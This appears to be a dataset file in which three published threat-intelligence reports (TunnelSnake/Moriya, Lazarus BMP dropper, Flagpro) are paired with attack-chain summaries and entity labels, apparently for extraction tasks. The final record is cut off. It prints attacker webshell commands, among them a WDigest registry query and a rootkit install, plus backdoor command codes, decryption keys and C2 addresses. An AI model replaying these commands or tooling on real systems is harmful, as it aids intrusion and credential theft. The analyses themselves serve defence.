incoming Moriya packet from the server.url TunnelSnake | SecurelistIRP_MJ_DEVICE_CONTROL: used to register the keyword to check the beginning of every incoming TCP packet in order to identify Moriya-related traffic. The passed magic is anticipated to be six characters long.Fig. 6. Code used for registering the packet magic value from the driver sideHow were targeted servers initially infected?Inspecting the systems targeted by the rootkit, we tried to understand how they got infected in the first place. As previously mentioned, Moriya was seen deployed mostly on public-facing servers within the victim organizations. In one case, we saw the attacker infect an organizational mail server with the China Chopper webshell, using it to map the victim’snetwork and then deploy other tools in it. Moriya’s user mode agent was explicitly installed using a command line executed on the targeted server this way. This command and examples of others run on the victim machine via the webshell can be seen below.url TunnelSnake | Securelist123456789101112131415""cmd"" /c cd /d C:\inetpub\wwwroot\&ipconfig -all""cmd"" /c cd /d C:\inetpub\wwwroot\&reg queryHKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest""cmd"" /c cd /d C:\inetpub\wwwroot\&$public\acmsetup.exe""cmd"" /c cd /d C:\inetpub\wwwroot\&query user""cmd"" /c cd /d C:\inetpub\wwwroot\&ipconfig/all""cmd"" /c cd /d C:\inetpub\wwwroot\&ping google.com""cmd"" /c cd /d C:\inetpub\wwwroot\&netstat -anp tcp""cmd"" /c cd /d C:\inetpub\wwwroot\&tasklist /v""cmd"" /c cd /d C:\inetpub\wwwroot\&whoami""cmd"" /c cd /d C:\inetpub\wwwroot\&cd $windir\web\""cmd"" /c cd /d $windir\Web\&rundll32 MoriyaServiceX64.dll, Install""cmd"" /c cd /d C:\inetpub\wwwroot\&ipconfig/all""cmd"" /c cd /d C:\inetpub\wwwroot\&time /t In general, we assess that the group’s modus-operandi involves infiltrating organizationsthrough vulnerable web servers in their networks. For example, an older variant of Moriya named IISSpy (described below) targets IIS web servers. Our telemetry shows that it was likely deployed by exploiting CVE-2017-7269 to let the attackers gain an initial foothold on a server prior to running the malware.url TunnelSnake | SecurelistPost exploitation toolsetDuring our investigation we found a target in South Asia that enabled us to get a glimpse into some of the other tools that we assess were in use by the same attacker. The toolset includes programs used to scan hosts in the local network, find new targets, perform lateral movement to spread to them and exfiltrate files. While most of the tools seem custom made and tailored for the attackers’ activities, we could also observe some open-source malware frequently leveraged by Chinese-speaking actors. Following is an outline of these tools based on their purpose in the infection chain.url TunnelSnake | SecurelistNetwork Discovery: custom built programs used to scan the internal network and detect vulnerable services.url TunnelSnake | SecurelistHTTP scanner: command-line tool, found under the name ‘8.tmp’, which discovers web servers through banner grabbing. This is done by issuing a malformed HTTP packet to a given address, where no headers are included and the request is succeeded with multiple null bytes.Fig. 7. Malformed packet generated by HTTP scannerIf the server responds, the output will be displayed in the console, as shown below.url TunnelSnake | SecurelistFig. 8. Console output with a server response displayed upon discovery of a new server in the networkDCOM Scanner: another command-line utility that attempts to connect to a remote host on TCP port 135 (RPC), and use the DCOM IOxidResolver interface to resolve addresses assigned to all network interfaces available on the remote system.Fig. 9. Output of the DCOM scanner utilityurl TunnelSnake | SecurelistLateral Movement: tools used to spread to other hosts in the targeted networks.url TunnelSnake | SecurelistBOUNCER: malware that was first described by Mandiant in their 2013 report on APT1. This tool is another passive backdoor that waits for incoming connections on a specific port and provides different features, as outlined below, that can be used to control a remote host and facilitate lateral movement from it.[2]12345678910111213141516170x01: Proxy Init Connection0x02: Proxy Send Packet0x03: Proxy Close Connection0x07: Execute Shellcode0x0A: Kill Bot0x0C: Reverse Shell CMD0x0D: Delete File0x0E: Execute local program0x0F: Enumerate Servers In Domain and save output in gw.dat0x10: Enumerate SQL Servers and save output in sql.dat0x12: Reverse Shell CreateProcess0x16: Upload File - Write Data0x17: Download File - Finish0x1E: Download File - Start0x1F: Upload File - Start0x2D: Enumerate Servers0x2E: Enumerate SQL Serverurl TunnelSnake | Securelist1819200x2F: Enumerate Servers Verbose0x30: Enumerate Users0x32: Do nothingThe BOUNCER sample that we observed contained a string that indicates which command-line arguments it anticipates:1 usage:%s IP port [proxip] [port] [key]However, the backdoor is configured to accept only the port number on which it will listen. We saw two versions of this backdoor, initiated by two different launchers. The first one is an executable file named nw.tmp that decrypts an embedded payload using the RC4 algorithm and injects it into a newly spawned svchost.exe process. The injected payload is similar to one described by Mandiant in 2013, which is yet another intermediate loader that decrypts and loads an embedded BOUNCER DLL. The last stage is started by invoking the DLL’s dump export with the arguments passed via the command line.The other version was stored with the name rasauto.dll in the system directory, impersonating the Windows Remote Access Auto Connection Manager library. Like the other version, it decrypts an embedded DLL using RC4, but this time uses no intermediate stage, instead directly calling the DLL’s dump export without arguments. The decrypted library is a slightly modified BOUNCER variant that always listens on the hardcoded port 1437.url TunnelSnake | SecurelistFig. 10. Code from the second BOUNCER variant that uses the hardcoded port 1437 to listen for new packetsBased on compilation timestamps of all BOUNCER-related executables, as shown below, we assess that the attacker reused old samples of the malware rather than compiled new versions of it:123456nw.tmp – stage 0 - launcher - 08-03-2017 03:56:24nw.tmp – stage 1 - embedded loader - 26-08-2014 04:49:58nw.tmp – stage 2 - embedded BOUNCER backdoor - 28-05-2012 13:44:37rasauto.dll - stage 0 – loader 26-08-2013 09:37:08rasauto.dll - stage 1 - embedded BOUNCER backdoor - 26-08-2013 09:36:27url TunnelSnake | SecurelistCustom PSExec: the attacker deployed a tool to execute commands remotely on compromised machines. Like the original PSExec tool, this one consists of two components – a client named tmp and a service named pv.tmp. In order to use the tool, the attacker has to execute it via a command line with the parameters specified below.1 Usage: psexec <hostname > psserve_path exefilename ServerName[option]\nThe service component is a tiny program that uses the CreateProcessA API to start a program specified as an argument. The client component uses the Service Control Manager (SCM) API to create a service on the target machine. If the ServerName argument is not specified, the service will be named Server%c%c where %c is a random lower case character. The exefilename argument is then passed to the StartServiceA function in order to initiate the command execution.Fig. 11. Code used to create and start the service on targeted hosturl TunnelSnake | SecurelistIt is worth noting that the program has some limitations. Compared with the original PSExec, it is not able to copy the service binary (i.e., pv.tmp, which has its path specified in the psserve_path argument) to a remote machine, but rather assumes it is already present on it. Besides, it cannot handle network credentials, limiting the ability to execute commands as other users, nor does it support pipes, which means it does not receive the output of the commands it issues.url TunnelSnake | SecurelistExfiltration: multi-platform utilities commonly used to establish connections with remote hosts and conduct file system operations on them, including file upload and download.url TunnelSnake | SecurelistEarthworm and Termite: well-known command-line utilities developed to facilitate intrusion into intranet networks. These programs are multiplatform and can be deployed on various architectures. Earthworm is used to create tunnels between compromised hosts and transfer data.Fig. 12. Earthworm help messageTermite provides additional features to download and upload files between the compromised hosts, as well as a way to spawn a remote shell to control the targeted machine.url TunnelSnake | SecurelistFig. 13. Termite help messageurl TunnelSnake | SecurelistTRAN: another tool that we detected under the filename tmp that was used to transfer data between compromised hosts. The binary we saw operated as a loader that embodies a tiny web server encrypted with the RC4 algorithm within it. This server is later injected into a newly created legitimate schtask.exe process and usually listens on port 49158. It is used for managing files uploaded by the attacker into an in-memory virtual file system maintained by the malware.By default the file system includes a tiny program named client.exe, which can be downloaded by any host using a standard HTTP GET request to the path /client.exe. This file is a command-line utility that can be used to control the virtual file system managed by the server, through one of several available commands outlined below.Fig. 14. Client.exe help messageIISSpy: tracing Moriya back to a user-mode rootkitIISSpy is an older user-mode version of the Moriya rootkit that we were able to pinpoint in our telemetry. It is used to target IIS servers for establishing a backdoor in their underlying websites. It was detected on a machine in 2018, unrelated to any of the attacks in the current operation. This suggests the threat actor has been active since at least that year.The malware, which comes as a DLL, achieves its goals by enumerating running IIS processes on the server (i.e., those that are executed from the image w3wp.exe), and injecting the malware’s DLL into them to alter their behavior. The executed code in the IIS processes will then set inline hooks for several functions, most notably CreateFileW.The corresponding CreateFileW hook function checks if the filename argument contains the directory ‘\MORIYA\’ or ‘\moriya\’ in its path, and if so, infers that the attacker has sent a specially crafted HTTP request to the web server. In this request, the Moriya path in the URL is followed by an encoded command. After the command is decoded and processed, it is passed via a mailslot (\\.\mailslot\slot) to a separate thread, while signaling an event called Global\CommandEvent.url TunnelSnake | SecurelistFig. 15. Code of the CreateFileW hook function that looks for the ‘MORIYA’ \ ‘moriya’ directory in a request pathShould the currently handled file contain the Moriya path, the very same hook function will generate a special file on the web server to which command execution output will be written. This file’s path is created by finding the position of the ‘\MORIYA\’ or ‘\moriya\’ strings in the inspected filename argument, and replacing it with the string ‘\IISINFO.HTM’. This will then be appended to the command data passed on the mailslot, following a ‘ > ‘ character.The other thread waiting on the command event mentioned above is in charge of processing attacker data fetched from the mailslot. Any such command will be read and parsed to find the ‘ > ‘ character and the file path that follows it, in this case the one corresponding to ‘IISINFO.HTML’. After executing the command via cmd.exe, the output will be written to the file in this path, allowing the attacker to read it by issuing a corresponding HTTP request where the URL path leads to this file on the server.Other functions that are hooked in the IIS process are CreateProcessAsUserW and CreateProcessW. These are used to detect if the current process spawns a new server instance, which will in turn be injected with the malware’s DLL. Apart from this, IISSpy will also create a monitoring thread that will periodically look for newly created httpd.exe processes, corresponding to the Apache server. If detected, the malware will be injected to them as well.Although it is evident from both the functionality and use of the Moriya keyword by the malware that IISSpy and the Moriya rootkit are related, further evidence in the code substantiates the connection:The older variant is capable of creating a reverse shell transmitted through an overt channel in exactly the same way as the more recent version of the malware, i.e., it identifies a connect request followed by a C&C server address and port, connects to it and redirects the IO of a new exe process to the underlying socket.url TunnelSnake | SecurelistBoth variants use the same packet encoding and decoding algorithm, whereby each clear-text byte is XORed with 0x5 and negated, and vice-versa.Fig. 16. Packet decoding loop that follows the same logic as that used in MoriyaIn both cases the developers left a trail of unique debug messages, issued to the OutputDebugString API function. An example of such a string used in identical code in the two variants is shown below.url TunnelSnake | SecurelistFig. 17. Code used in both variants to spawn a new shell, while printing unique debug messagesBoth implants are deployed by invoking an export function named Install that creates a service that allows persistent execution, with the malware’s logic residing in the ServiceMain Moreover, the Install functions are highly similar to one another.url TunnelSnake | SecurelistFig. 18. Comparison of Install export function CFGs between IISSpy and MoriyaThe ProcessKiller rootkit vs. security productsurl TunnelSnake | SecurelistAnother interesting artefact found in our telemetry that could be tied to the developers of Moriya is a malware named ProcessKiller. As its name suggests, it is intended to eliminate execution of processes, with the use of a kernel mode driver. Ultimately, this tool is used to shut down and block initiation of AV processes from kernel space, thus allowing other attack tools to run without being detected.This malware operates through the following stages:An attacker calls the malware’s DLL from an export named Kill, passing it a list of process names it would like to shut down and block as a command-line argument. The malware writes a driver that is embedded as a resource within it, impersonating a Kaspersky driver under the path %SYSTEM%\drivers\kavp.sys. There is an attempt to load the driver using the Service Control Manager. However, since it is not signed and loading is prone to fail on Windows versions above Vista 64-bit, the malware uses the same DSEFix code to bypass Digital Signature Enforcement as witnessed in Moriya’s user mode agent. The malware parses the process names passed as arguments and creates a vector of ‘blacklisted processes’ out of them. For each process in the list, the malware detects its PID and issues it through an IOCTL with code 0x22200C to the driver which is in charge of shutting it down from kernel space. The shutdown is carried out by locating the process object with the function PsLookupProcessByProcessId and then terminating it with ZwTerminateProcess. The list of processes is then passed via another IOCTL with the code 0x222004 to the driver, which inserts each member of it to a linked list in kernel space. When the driver is bootstrapped, it registers a callback for newly created processes through the PsSetCreateProcessNotifyRoutineEx function, which inspects the image name of the created process and compares it against those found in the linked list. If a match is found, the process creation status in the PPS_CREATE_NOTIFY_INFO structure will be set to STATUS_UNSUCCESSFUL, signaling the user space API function that process creation failed. At this point any other malware can theoretically operate without being detected. If the attacker wishes to disable blacklisting, it can be done by issuing an IOCTL with the code 0x222008, which would destroy the linked list of blacklisted processes.Once again, the connection to Moriya is based on several observations:Distinct debug error messages, as the one presented below.Fig. 19. Unique debug message that appears in ProcessKiller and Moriyaurl TunnelSnake | SecurelistFilename of the same structure, i.e., Moriya’s agent is internally named ‘MoriyaServiceX64.dll’, and ProcessKiller’s DLL is named ‘ProcessKillerX64.dll’ Usage of the exact same DSEFix code to load an unsigned driver.What do we know about the threat actor?Unfortunately, we are not able to attribute the attack to any particular known actor, but based on the TTPs used throughout the campaign, we suppose it is a Chinese-speaking one. We base this on the fact that the targeted entities were attacked in the past by Chinese-speaking actors, and are generally located in countries that are usually targeted by such an actor profile. Moreover, the tools leveraged by the attackers, such as China Chopper, BOUNCER, Termite and Earthworm, are an additional indicator supporting our hypothesis as they have previously been used in campaigns attributed to well-known Chinese-speaking groups.Who were the targets?Based on our telemetry the attacks were highly targeted and delivered to less than 10 victims around the world. The most prominent victims are two large regional diplomatic organizations in South-East Asia and Africa, while all the others were victims in South Asia.ConclusionThe TunnelSnake campaign demonstrates the activity of a sophisticated actor that invests significant resources in designing an evasive toolset and infiltrating networks of high-profile organizations. By leveraging Windows drivers, covert communications channels and proprietary malware, the group behind it maintains a considerable level of stealth. That said, some of its TTPs, like the usage of a commodity webshell and open-source legacy code for loading unsigned drivers, may get detected and in fact were flagged by our product, giving us visibility into the group’s operation.Still, with activity dating back to at least 2018, the threat actor behind this campaign has shown that it is able to evolve and tailor its toolset to target environments. This indicates the group conducting these attacks may well still be active and retooling for additional operations in the area of interest outlined in this publication, as well as other regions. With that in mind, we continue to track thisurl TunnelSnake | Securelistattacker and look for signs of its reappearance in the wild. Any findings and updates will be made available to customers of our Threat Intelligence Portal.For more information about operation TunnelSnake and the underlying threat actor, contact us at: intelreports@kaspersky.com. To learn more on reverse engineering and malware analysis from Kaspersky GReAT experts, check out the website url AgentA2C4EE84E3A95C8731CA795F53F900D5Moriya 64-bit Driver5F0F1B0A033587DBCD955EDB1CDC24A4IISSpyC1159FE3193E8B5206006B4C9AFBFE62ProcessKillerDA627AFEE096CDE0B680D39BD5081C41ProcessKiller Driver – 32-bit07CF58ABD6CE92D96CFC5ABC5F6CBC9A ProcessKiller Driver – 64-bit9A8F39EBCC580AA56D6DDAF5804EAE61pv.tmp (Custom PSExec Server)39C361ABB74F9A338EA42A083E6C7DF8pc.tmp (Custom PsExec Client)DE3FB65461EE8A68A3C7D490CDAC296Dtran.tmp (Exfiltration tool)EAC0E57A22936D4C777AA121F799FEE6client.exe (Utility embedded in tran.tmp)D745174F5B0EB41D9F764B22A5ECD357rasauto.dll (Bouncer Loader)595E43CDF0EDCAA31525D7AAD87B7BE48.tmp (HTTP )Scanner9D75B50727A8E732DB0ADE7E270A7395ep.tmp DCOM Scannerurl TunnelSnake | Securelist3A4E1F3F7E1BAAB8B02F3A8EE20F98C9nw.tmp Bouncer Loader47F2D06713DAD556F535E523B777C682Termite45A5D9053BC90ED657FA90DE0B775E8FEarthworm[1]Today a copy of the original code can be found here: url TunnelSnakeYour email address will not be published. Required fields are marked *url ","1. Attacker compromises public-facing servers using vulnerabilities like CVE-2017-7269. 2. Attacker installs Moriya rootkit remotely using webshells like China Chopper. 3. Moriya rootkit intercepts packets in kernel mode and filters out traffic marked with a ""magic value"". 4. Attacker sends commands over the covert C2 channel established by Moriya. 5. Moriya executes commands, exfiltrates data over the covert channel back to the attacker. 6. Attacker spreads laterally using tools like BOUNCER, Termite, Earthworm. 7. Additional data exfiltration done using custom tools like TRAN. 8. Persistence maintained by installing Moriya as a service on compromised servers. ",valid_25,"['public-facing servers', 'us', 'CVE-2017-7269', 'Install', 'Moriya', 'rootkit', 'China Chopper', 'packets', 'kernel mode', 'traffic', 'commands', 'C2', 'data', 'the covert channel', 'the attacker', 'tools', 'Bouncer', 'Termite', 'Earthworm', 'IO', 'TRAN', 'persistence', 'a service']",public-facing servers; us; CVE-2017-7269; Install; Moriya; rootkit; China Chopper; packets; kernel mode; traffic; commands; C2; data; the covert channel; the attacker; tools; Bouncer; Termite; Earthworm; IO; TRAN; persistence; a service.
"Lazarus APT conceals malicious code within BMP image to drop its RATblog.malwarebytes.com/malwarebytes-news/2021/04/lazarus-apt-conceals-malicious-code-within-bmp-file-to-drop-its-ratThreat Intelligence TeamApril 19, 2021This blog was authored by Hossein JaziLazarus APT is one of the most sophisticated North Korean Threat Actors that has been active since at least 2009. This actor is known to target the U.S., South Korea, Japan and several other countries. In one of their most recent campaigns Lazarus used a complex targeted phishing attack against security researchers.Lazarus is known to employ new techniques and custom toolsets in its operations to increase the effectiveness of its attacks. On April 13, we identified a document used by this actor to target South Korea. In this campaign, Lazarus resorted to an interesting technique of BMP files embedded with malicious HTA objects to drop its Loader.Process GraphThis attack likely started by distributing phishing emails that were weaponized with a malicious document. The following figure shows the overall process of this attack. In the next sections, we provide the detailed analysis of this process.1/19Figure 1: Process graphDocument AnalysisOpening the document shows a blue theme in Korean that asks the user to enable the macro to view the document.Figure 2: Blue themeUpon enabling the macro, a message box will pop up and after clicking the final lure will be loaded.2/19Figure 3: Lure formThe document name is in Korean “참가신청서양식.doc” and it is a participation application form for a fair in one of the South Korean cities. The document creation time is 31 March 2021 which indicates that the attack happened around the same time.The document has been weaponized with a macro that is executed upon opening.Figure 4: Macro3/19The macro starts by calling MsgBoxOKCancel function. This function pops up a message box to the user with a message claiming to be an older version of Microsoft Office. After showing the message box, it performs the following steps:Figure 5: Document_OpenDefines the required variables such as WMI object, Mshta and file extension in base64 format and then calls Decode function to base64 decode them. Gets the active document name and separates the name from extension Creates a copy of the active document in HTML format using ActiveDocument.SaveAs with wDFormatHTML as parameter. Saving document as HTML will store all the images within this document in FILENAME_files directory.4/19Figure 6: SaveAs HTMLCalls show function to makes document protected. By making document protected it makes sure users can not make any changes to the document.Figure 7: Protect the documentGets the image file that has an embedded zlib object. (image003.png) Converts the image in PNG format into BMP format by calling WIA_ConvertImage. Since the BMP file format is uncompressed graphics file format, converting a PNG file format into BMP file format automatically decompresses the malicious zlib object embedded from PNG to BMP. This is a clever method used by the actor to bypass security mechanisms that can detect embedded objects within images. The reason is because the document contains a PNG image that has a compressed zlib malicious object and since it’s compressed it can not be detected by static detections. Then the threat actor just used a simple conversion mechanism to decompress the malicious content.Figure 8: Embedded objects within png and bmp file5/19Figure 9: Embedded hta file within bmpGets a WMI object to call Mshta to execute the bmp file. The BMP file after decompression contains a HTA file which executes Java Script to drop a payload. Deletes all the images in the directory and then removes the directory generated by the SaveAs function.BMP file analysis (image003.zip)The macro added the extension zip to the BMP file during the image conversion process to pretend it’s a zip file. This BMP file has an embedded HTA file. This HTA contains a JavaScript that creates “AppStore.exe” in the “C:\Users\Public\Libraries\AppStore.exe” directory and then populates its content.At the start, it defines an array that contains the list of the functions and parameters required by the script: OpenTextFile, CreateTextFile, Close, Write, FromCharCode, “C:/Users/Public/Libraries/AppStore.exe” and some junk values. When the script wants to perform an action, it calls a second function with a hex value that is responsible for building an index to retrieve the required value from the first array.For example, at the first step it calls the second function with 0x1dd value. This function subtracts 0x1dc from 0x1dd to get the index for the first array which would be 1. Then it uses this index to retrieve the first element of the first array which would be “C:/Users/Public/Libraries/AppStore.exe”. Following the same process, it calls CreateTextFile to create AppStore.exe and then writes MZ into it. Then it converts the data in decimal format to string by calling fromCharCode function and uses the same procedure it writes them into the AppStore.exe. At the end it calls Wscript.Run to execute the dropped payload.6/19Figure 10: Embedded HTA objectPayload analysis (AppStore.exe)AppStore.exe loads a base64 encrypted payload that has been added to the end of itself. Before the payload there is a string which is the decryption key (by7mJSoKVDaWg*Ub).7/19Figure 11: Embedded payloadTo decrypt the second stage payload, at first it writes itself into a buffer created by VirtualAlloc and then looks for the encrypted payload and copies it into another buffer.8/19Figure 12: Allocate memoryIn the next step, it has implemented its own base64 decoder to decode the allocated buffer and write it into another buffer using memset and memmove. At the end, this encoded payload gets decrypted via XOR using hardcoded decryption key to generate the second stage payload.9/19Figure 13: XOR decryptionAfter the decryption process has finished, it jumps to the start address of the second payload to execute it.Second stage payload AnalysisThis payload is loaded into memory by AppStore.exe and has not been written to disk. It starts by performing an initialization process which includes the following steps:10/19Figure 14: Initialization processCreate Mutex: Checks if a mutex with “Microsoft32” name exist on machine or not and if it exists, it exits. Otherwise, It means the machine has not been infected with this RAT and it starts its malicious activities. Resolve API calls: All important API calls have been base64 encoded and RC4 encrypted which will be decoded and decrypted at run time. The key for RC4 decryption is “MicrosoftCorporationValidation@#$%^&*()!US”.11/1912/19Figure 15: API resolverMakes HTTP requests to command and control servers: The server addresses have been base64 encoded and encrypted using a custom encryption algorithm. You can find the decoder/decryptor here. This custom encryption algorithm is similar to the encryption algorithm used by BISTROMATH RAT associated to Lazarus reported by US-CERT.Figure 16: Custom decryption algorithmurl url the initialization process has finished, it checks if the communications to C&C servers were successful or not and if they were successful it goes to the next step in which it receives the commands from the server and performs different actions based on the commands.The commands received from the C&C are base64 encoded and encrypted using its custom encryption algorithm (Figure 16). After deobfuscation, it performs the following commands based on the command codes. The communications to the server have been done through send and recv socket functions.8888: It tries to execute the command it has received after command code in two different ways. At first it tries to execute the command by creating a new thread (Figure 17). This thread gets the command after command code and executes it using cmd.exe. This process has been done through using CreatePipe and CreateProcessA. Then it uses ReadFile to read the output of cmd.exe.13/19Figure 17: Create threadOutput of cmd.exe has been encoded and encrypted and is sent to the server as test.gif using an HTTP POST request (Figure 18).14/1915/19Figure 18: Send the output of cmd.exe as test.gifIf the CreateThread process was not successful, it executes the command by calling WinExec and then sends the “”8888 Success!” message after encrypting it using its custom encryption and then encoding it using base64 to the server as test.gif.Figure 19: WinExec1234: It calls CreateThread to execute the buffer(third stage payload) it received from the server. At the end it encodes and encrypts “1234 Success!” and sends it to the server as test.gif. 2099: It creates a batch file and executes it and then exits. This batch file deletes the AppStore.exe from the victim’s machine.16/19Figure 20: Creates batch file8877: It stores the buffer received from server in a file. 1111: It calls The shutdown function to disables sends or receives on a socket.This second stage payload has used custom encoded user agents for its communications. All of these user agents have been base64 encoded and encrypted using the same custom encryption algorithm used to encrypt the server addresses. Here is the list of the different user agents used by this RAT.Mozilla/%d.0 (compatible; MSIE %d.0; Windows NT %d.%d; WOW64; Trident/%d.0; Mozilla/18463680.0 (compatible; MSIE -641.0; Windows NT 1617946400.-858993460; WOW64; Trident/-858993460.0; Infopath.-858993460) Mozilla/18463680.0 (compatible; MSIE -641.0; Windows NT 1617946400.-858993460; Trident/-858993460.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Infopath.-858993460) Mozilla/%d.0 (Windows NT %d.%d%s) AppleWebKit/537.%d (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/%d.%d Infopath.%dAttributionThere are several similarities between this attack and past Lazarus operations and we believe these are strong indicators to attribute this attack to the Lazarus threat actor.17/19The second stage payload has used the similar custom encryption algorithm that has been used by BISTROMATH RAT associated to this APT. The second stage payload has used a combination of base64 and RC4 for data obfuscation which is a common technique used by this APT. The second stage payload used in this attack has some code similarities with some of known Lazarus malware families including Destover. Sending data and messages as a GIF to a server has been observed in past Lazarus operations including AppleJeus, Supply Chain attack against South Korea and the DreamJob operation. This phishing attack has targeted South Korea which is one of the main targets of this actor. The group is known to use Mshta.exe to run malicious scripts and download programs which is similar to what has been used in this attack.ConclusionThe Lazarus threat actor is one of the most active and sophisticated North Korean threat actors that has targeted several countries including South Korea, the U.S. and Japan in the past couple of years. The group is known to develop custom malware families and use new techniques in its operations. In this blog we documented a spear phishing attack operated by this APT group that has targeted South Korea.The actor has used a clever method to bypass security mechanisms in which it has embedded its malicious HTA file as a compressed zlib file within a PNG file that then has been decompressed during run time by converting itself to the BMP format. The dropped payload was a loader that decoded and decrypted the second stage payload into memory. The second stage payload has the capability to receive and execute commands/shellcode as well as perform exfiltration and communications to a command and control server.Indicators of Compromise18/19DocumentF1EED93E555A0A33C7FEF74084A6F8D06A92079E9F57114F523353D877226D72Dropped executableED5FBEFD61A72EC9F8A5EBD7FA7BCD632EC55F04BDD4A4E24686EDCCB0268E05Command and control serversjinjinpig[.]co[.]kr mail[.]namusoft[.]kr19/19 ","1. A phishing email containing weaponized document is distributed. 2. The document contains macros that save it as HTML to access embedded images. 3. A PNG image is converted to BMP to decompress an embedded HTA file. 4. The HTA file is executed using mshta.exe to drop malware. 5. The malware decrypts and loads a RAT payload into memory. 6. The RAT initializes APIs, contacts C2 servers, and can receive encrypted commands. 7. Commands allow process execution, script execution, and data exfiltration. ",valid_83,"['the document', 'HTML', 'images', 'a PNG image', 'BMP', 'an embedded HTA file', 'US', 'Mshta.exe', 'malware', 'loads', 'memory', 'API', 'C2', 'servers', 'commands', 'data', 'exfiltration']",the document; HTML; images; a PNG image; BMP; an embedded HTA file; US; Mshta.exe; malware; loads; memory; API; C2; servers; commands; data; exfiltration.
"Flagpro: The new malware used by BlackTechinsight-jp.nttsecurity.com/post/102hf3q/flagpro-the-new-malware-used-by-blacktechHiroki HadaThis article is a translation of the ""グループBlackTechがするマルウェアFlagproについて"".Introduction BlackTech has been actively attacking, some attack cases against Japanese companies were observed. BlackTech uses a new malware for these attack cases. We call it “Flagpro”. We are sharing its overview, timeline and detailed analysis result in this article.Attack overview Flagpro is used in the initial stage of attacks to investigate target’s environment, download a second stage malware and execute it. An attack case using Flagpro starts with a spear phishing e-mail. The message is adjusted to its target organization. It is disguised as an e-mail communication with target’s business partner. This means the attackers probed deeper into their target before attacking.The attackers attach a password protected archived file (ZIP or RAR) to the email, and they write its password in the message. The archived file includes an xlsm format file and it contains a malicious macro. If a user activates the macro, a malware will be dropped. They also adjust the contents of the xlsm file to the target. Therefore, it is not easy to feel at odds with the file sent by the attacker.After the macro is executed, it creates an EXE file in startup directory. This EXE file is “Flagpro”. In the most cases, this created EXE files are named “dwm.exe”. When the system launches next time, Flagpro, which was placed in startup directory as “dwm.exe”, will be executed.Flagpro communicates with a C&C server, and it receives commands to execute from the server, or Flagpro downloads a second stage malware and then executes it. The attackers check the target’s environment whether it is suitable for running the second stage malware or not. If they determine to attack the target, another malware sample will be downloaded and executed.Timeline We have observed attack cases using Flagpro against multiple companies (Defense, Media, Communications) several times. In October 2020, a sample related to Flagpro was submitted to an online service. Therefore, Flagpro may have already been used for attacking cases at that point.1/6Flagpro functions In July 2021, our SOC observed new Flagpro using MFC(Microsoft Foundation Class) library for its implementation. MFC library had not been used for old Flagpro. This Flagpro had classes such as ”CV20_LoaderApp” and ”CV20_LoaderDlg”. We assume that the role of Flagpro is a downloader and the sample version was 2.0 from these class names.We call this sample using MFC as “Flagpro v2.0” and old one as “Flagpro v1.0” in this article.Following list indicates Flagpro’s main functions:Download and execute a tool Execute OS commands and send the results Collect and send Windows authentication informationThese commands are implemented in a member function of CV20_LoaderApp class in Flagpro v2.0.Once Flagpro is launched, it communicate with a C&C server and executes the received commands as shown in the above list. After designated interval, it repeats this behavior.Regarding to downloading and executing a tool, Flagpro stores the downloaded file in file path “%Temp%\~MY[0-9A-F].tmp” first. Then, Flagpro adds extension “.exe” to the name of stored file and executes the file.In the implementation of Flagpro v1.0, if a dialog titled “Windows セキュリティ” is displayed when Flagpro accesses to an external site, Flagpro automatically clicks OK button to close the dialog. This handling also works when the dialog is written Chinese and English. It can indicate the targets are Japan, Taiwan, and English-speaking countries. Flagpro v2.0 checks whether both username and password are filled in a dialog as an additional feature before clicking the OK button.Flagpro v2.0 has another new function. If a dialog title is “Internet Explorer [7-11]” (the number after “Internet Explorer” depends on what version the user users) when Flagpro accesses to an external site, Flagpro sends WM_CLOSE message to close the dialog.2/6We assume that these functions, which close a dialog automatically, are implemented to reduce a risk that a user detects an external connection by Flagpro.In Flagpro v2.0, the same codes in below figure are repeatedly inserted to hide important as a handy obfuscation technique:Received commands The received commands from a C&C server are encoded with Base64. Following format is the decoded command about Flagpro v2.0:Download Command field consists of two flags(Exec and Yes) and URL path like following:First string “Exec” is the action flag. If it is not included in both Download Command fields in the command, Flagpro will not execute the main processes such as downloading, executing OS commands, collecting authentication information, and so on. Next string “Yes” is the execution flag. If a Download Command field has “ExecYes”, Flagpro downloads and executes the file. If a command is “Exec/malware.html” like the above image, Flagpro only downloads a file.Time Interval field means a number of waiting time for the next command. The unit is millisecond.Following image is an actual example of the received commands:Communications with C&C server3/6Connection handlings to a C&C server about Flagpro v1.0 and v2.0 uses COM objects of Internet Explorer. Flagpro communicates with C&C server using HTTP.In requesting commands, sending execution results of OS commands or collected authentication information, Flagpro accesses a C&C server with specific URL paths and queries. It encodes data with Base64 and sends to the C&C server. Following table shows relations between Flagpro’s activities and the URL paths and queries.Related activitiesURL paths and queriesRequest command/index.htmlSend result of OS command execution /index.htmld?flag=[Encoded Data]Send authentication information/index.htmld?flagpro=[Encoded Data]When Flagpro downloads a tool, there is no specific URL path because it uses the file name on the server.Following image shows a traffic when Flagpro v2.0 connects to a C&C server:As of July 2021, we do not know why, but we observed a response “Hello Boy!” from the C&C server, when we access to the arbitrary paths other than the URL paths shown in the table above. Following image is an example of the response:4/6Detections To detect attacks using Flagpro, it is effective to create and install custom signature both on network and endpoint devices. For the network detection, Flagpro’s characteristic URL paths are useful such as index.htmld?flag=[Base64 string] and index.htmld?flagpro=[Base64 string].For the endpoint detection, naming rules of temporary files that Flagpro create such as %TEMP%\~MY[0- 9A-F].tmp and %TEMP%\~MY[0-9A-F].tmp.exe are effective. In addition, the investigation commands after Flagpro establishes the connection with the C&C server like following are also useful for detection. Following commands are a part of examples:Conclusion We have observed attack cases using Flagpro against Japan since October 2020. The attack techniques have not changed a lot, but BlackTech uses more evading techniques. For example, they adjust decoy files and file names to their target and check carefully target’s environment. Recently, they have started using other new malwares called “SelfMake Loader” and “Spider RAT”. It means that they are actively 45[.]76.184.227 45[.]32.23.140 139[.]162.87.180 107[.]191.61.405/6172[.]104.109.217 org.misecure[.]com update.centosupdates[.]com6/6 ",1. Emails with malicious macro docs are sent to targets. 2. The macros drop the Flagpro malware. 3. Flagpro communicates with a C2 server. 4. It can download and execute additional malware from the C2. 5. Flagpro runs commands received from the C2. 6. It collects system info like authentication data to send back. 7. Flagpro uses encoded HTTP requests to specific paths to communicate with the C2. 8. It automatically closes security dialogs during execution to avoid detection. ,valid_40,"['mail', 'targets', 'the macro', 'Flagpro communicates', 'Download', 'addition', 'commands', 'Received', 'data', 'HTTP', 'execution', 'detection']",mail; targets; the macro; Flagpro 